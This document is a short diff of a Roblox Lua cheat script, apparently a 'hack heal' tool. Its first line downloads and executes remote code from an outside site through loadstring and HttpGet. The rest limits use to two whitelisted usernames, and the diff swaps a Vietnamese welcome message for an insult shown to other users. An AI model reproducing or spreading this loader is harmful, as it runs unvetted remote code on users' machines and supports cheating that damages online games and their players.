@@ -1,14 +1,14 @@
 loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
 local allowedUsers = {
     ["vxgore_06"] = true,
-    ["phandung3614"] = true,
+    ["phandung3614"] = true
 }
 local currentUserName = game.Players.LocalPlayer.Name
 
 if not allowedUsers[currentUserName] then
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hi";
-        Text = "chào mừng đến vs hack heal";
+        Title = "???";
+        Text = "thg ngu ơi không trình mà còn đòi dùng hack của cha à.";
         Duration = 5;
     })
     return
